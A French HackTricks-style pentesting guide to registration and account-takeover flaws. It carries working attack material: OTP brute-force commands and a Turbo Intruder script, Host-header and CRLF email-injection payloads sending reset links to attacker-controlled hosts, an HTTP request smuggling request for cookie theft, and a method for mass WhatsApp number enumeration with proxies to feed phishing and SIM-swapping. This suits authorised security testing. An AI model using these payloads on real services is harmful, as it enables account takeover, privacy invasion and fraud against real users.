# Vulnérabilités d'enregistrement et de prise de contrôle

{{#include ../banners/hacktricks-training.md}}

## Prise de contrôle via l'inscription

### Enregistrement dupliqué

- Essayez de vous enregistrer en utilisant un nom d'utilisateur existant
- Testez différentes variantes de l'email :
- majuscules
- +1@
- ajoutez un point dans l'email
- caractères spéciaux dans la partie locale de l'email (%00, %09, %20)
- Ajoutez des caractères vides après l'e-mail : `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Essayez des astuces de canonicalisation du fournisseur d'email (dépend du service) :
- Gmail ignore les points et le subaddressing : `victim+1@gmail.com`, `v.ic.tim@gmail.com` deliver to `victim@gmail.com`
- Certains fournisseurs ne tiennent pas compte de la casse dans la partie locale
- Certains fournisseurs acceptent les confusables Unicode. Essayez des homoglyphes et le soft hyphen `\u00AD` dans la partie locale
- Abusez-en pour : contourner les vérifications d'unicité, obtenir des comptes en double/workspace invites, ou bloquer les inscriptions de la victime (DoS temporaire) pendant que vous préparez une prise de contrôle

### Énumération de noms d'utilisateur

Vérifiez si vous pouvez déterminer quand un nom d'utilisateur a déjà été enregistré dans l'application.

- Messages d'erreur différents ou codes de statut HTTP
- Différences de timing (un utilisateur existant peut déclencher une recherche vers l'IdP/DB)
- Remplissage automatique du formulaire d'inscription avec les données de profil pour des e-mails connus
- Testez les flux d'équipe/invitation : saisir un email peut révéler si un compte existe

### Politique de mot de passe

Lors de la création d'un utilisateur, vérifiez la politique de mot de passe (vérifiez si vous pouvez utiliser des mots de passe faibles).  
Dans ce cas vous pouvez essayer de bruteforce credentials.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement) pour apprendre comment tenter des prises de contrôle de compte ou extraire des informations via **SQL Injections** dans les formulaires d'enregistrement.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Changer l'email

Une fois enregistré, essayez de changer l'email et vérifiez si ce changement est correctement validé ou si vous pouvez le modifier vers des emails arbitraires.

### Autres vérifications

- Vérifiez si vous pouvez utiliser **disposable emails** (mailinator, yopmail, 1secmail, etc.) ou contourner la blocklist avec le subaddressing comme `victim+mailinator@gmail.com`
- **Mot de passe** **long** (>200) mène à un **DoS**
- **Vérifiez les rate limits** sur la création de comptes
- Utilisez username@**burp_collab**.net et analysez le **callback**
- Si la vérification par numéro de téléphone est utilisée, testez les cas limites de parsing/injection du numéro

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Découverte de contacts / oracles d'énumération d'identifiants

Les messengers centrés sur le numéro de téléphone exposent un **oracle de présence** dès que le client synchronise les contacts. Rejouer les requêtes de discovery de WhatsApp a historiquement permis **>100M lookups per hour**, permettant des énumérations de comptes quasi-complètes.

**Flux d'attaque**

1. **Instrumentez un client officiel** pour capturer la requête d'upload du carnet d'adresses (blob authentifié de numéros normalisés E.164). Rejouez-la avec des numéros générés par l'attaquant tout en réutilisant les mêmes cookies/device token.
2. **Regroupez les numéros par requête** : WhatsApp accepte des milliers d'identifiants et renvoie les statuts enregistrés/non enregistrés plus des métadonnées (business, companion, etc.). Analysez les réponses offline pour construire des listes de cibles sans envoyer de messages aux victimes.
3. **Scalez horizontalement** l'énumération avec des SIM banks, cloud devices, ou residential proxies afin que le throttling par compte/IP/ASN ne se déclenche jamais.

**Modélisation du plan de numérotation**

Modélisez le plan de numérotation de chaque pays pour éviter les candidats invalides. Le dataset NDSS (`country-table.*`) liste les codes pays, la densité d'adoption, et la répartition par plateforme afin que vous puissiez prioriser les plages à fort taux de hits. Exemple de code d'initialisation :
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritise les préfixes qui correspondent à de vraies allocations (Mobile Country Code + National Destination Code) avant d'interroger l'oracle pour garder un débit utile.

**Turning enumerations into targeted attacks**

- Alimentez les leaked phone numbers (e.g., Facebook’s 2021 breach) dans l'oracle pour savoir quelles identités sont encore actives avant phishing, SIM-swapping, ou spamming.
- Découpez les recensements par pays/OS/type d'app pour trouver des régions avec un filtrage SMS faible ou une forte adoption de WhatsApp Business pour du social engineering localisé.

**Public-key reuse correlation**

WhatsApp expose la X25519 identity key de chaque compte lors du session setup. Demandez l'identity material pour chaque numéro énuméré et dédupliquez les public keys pour révéler des account farms, des clients clonés ou du firmware insecure — les clés partagées désanonymisent les opérations multi-SIM.

## Vérification Email/Phone faible (OTP/Magic Link)

Les flux d'inscription vérifient souvent la propriété via un OTP numérique ou un token de magic-link. Failles typiques :

- OTP devinable ou court (4–6 digits) sans rate limiting efficace ni suivi IP/appareil. Essayez des guesses parallèles et la rotation d'en-têtes/IP.
- Réutilisation de l'OTP entre actions ou comptes, ou pas lié à l'utilisateur/action spécifique (e.g., même code fonctionne pour login et signup, ou fonctionne après changement d'email).
- Multi-value smuggling: certains backends acceptent plusieurs codes et vérifient si l'un correspond. Essayez :
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distinguer wrong vs expired vs wrong-user codes par status/message/longueur du body.
- Tokens non invalidés après succès ou après changement de mot de passe/email.
- Le verification token n'est pas lié au user agent/IP, permettant une complétion cross-origin depuis des pages contrôlées par l'attaquant.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Essais parallèles/concurrents pour contourner les verrouillages séquentiels (utiliser Turbo Intruder dans Burp):

<details>
<summary>Extrait Turbo Intruder pour inonder de tentatives OTP à 6 chiffres</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: soumettez le même OTP valide simultanément dans deux sessions ; parfois une session devient un compte attaquant vérifié tandis que le flux de la victime réussit aussi.
- Testez aussi Host header poisoning sur les liens de verification (same as reset poisoning below) pour leak ou compléter la verification sur un host contrôlé par l'attaquant.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (avant que la victime ne s'inscrive)

Une classe puissante de problèmes survient lorsqu’un attaquant effectue des actions sur l’email de la victime avant que celle‑ci crée son compte, puis récupère l’accès plus tard.

Key techniques to test (adaptez aux flows de la cible) :

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Conseils pratiques

- Récupérez les flux et les endpoints depuis les bundles web/mobile. Cherchez classic signup, SSO linking, email/phone change et les endpoints de password reset.
- Créez une automation réaliste pour maintenir des sessions actives pendant que vous testez d’autres flows.
- Pour les tests SSO, déployez un IdP OIDC de test et émettez des tokens avec des claims `email` pour l’adresse de la victime et `email_verified=false` pour vérifier si le RP fait confiance à des IdP non vérifiés.
- Après tout password reset ou changement d’email, vérifiez que :
  - toutes les autres sessions et tokens sont invalidés,
  - les opérations de changement d’email/phone en attente sont annulées,
  - les IdPs/emails/phones précédemment liés sont revérifiés.

Remarque : Une méthodologie étendue et des études de cas de ces techniques sont documentées par les recherches de Microsoft sur le pre‑hijacking (voir References à la fin).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Vérifiez si le referer header leak le token de password reset.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR sur les paramètres API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. L'attaquant doit se connecter avec son compte et aller à la fonctionnalité **Changer le mot de passe**.
2. Démarrer Burp Suite et intercepter la requête
3. Envoyer vers l'onglet Repeater et modifier les paramètres : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Token de réinitialisation de mot de passe faible <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Le token de réinitialisation devrait être généré aléatoirement et unique à chaque fois.\
Essayer de déterminer si le token expire ou s'il est toujours le même ; dans certains cas l'algorithme de génération est faible et peut être deviné. Les variables suivantes peuvent être utilisées par l'algorithme.

- Horodatage
- UserID
- Email de l'utilisateur
- Prénom et nom
- Date de naissance
- Cryptographie
- Seulement des chiffres
- Séquence de token courte ( characters between \[A-Z,a-z,0-9])
- Réutilisation du token
- Date d'expiration du token

### Leaking Token de réinitialisation de mot de passe <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Déclencher une demande de réinitialisation de mot de passe via l'API/UI pour un email spécifique, par ex : test@mail.com
2. Inspecter la réponse du serveur et vérifier `resetToken`
3. Puis utiliser le token dans une URL comme `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Réinitialisation de mot de passe via collision de nom d'utilisateur <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. S'enregistrer sur le système avec un nom d'utilisateur identique à celui de la victime, mais en insérant des espaces avant et/ou après le nom d'utilisateur. ex : `"admin "`
2. Demander une réinitialisation de mot de passe avec votre nom d'utilisateur malveillant.
3. Utiliser le token envoyé à votre email et réinitialiser le mot de passe de la victime.
4. Se connecter au compte victime avec le nouveau mot de passe.

La plateforme CTFd était vulnérable à cette attaque.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Prise de contrôle de compte via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Trouver un XSS dans l'application ou un sous-domaine si la portée des cookies est le domaine parent : `*.domain.com`
2. Leak the current **sessions cookie**
3. S'authentifier en tant qu'utilisateur en utilisant le cookie

### Prise de contrôle de compte via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Utiliser **smuggler** pour détecter le type de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Composer une requête qui écrasera le `POST / HTTP/1.1` avec les données suivantes :\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` dans le but d'ouvrir une redirection des victimes vers burpcollab et de voler leurs cookies\
3. La requête finale pourrait ressembler à ce qui suit
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone rapporte l'exploitation de ce bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Créer un payload pour le CSRF, e.g: “HTML form with auto submit for a password change”
2. Envoyer le payload

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token might be used to authenticate an user.

- Modifier le JWT avec un autre User ID / Email
- Vérifier la présence d'une signature JWT faible

{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Certains signup handlers effectuent un upsert lorsque l'email fourni existe déjà. Si l'endpoint accepte un body minimal contenant un email et un password et n'applique pas de vérification de propriété, l'envoi de l'email de la victime écrasera son password pre-auth.

- Discovery: récolter les endpoint names depuis le bundled JS (ou le mobile app traffic), puis fuzz les base paths comme /parents/application/v4/admin/FUZZ en utilisant ffuf/dirsearch.
- Method hints: un GET retournant des messages comme "Only POST request is allowed." indique souvent le bon verbe et qu'un body JSON est attendu.
- Minimal body observed in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Exemple PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impact : Full Account Takeover (ATO) sans aucun reset token, OTP ou vérification par e-mail.

## Références

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
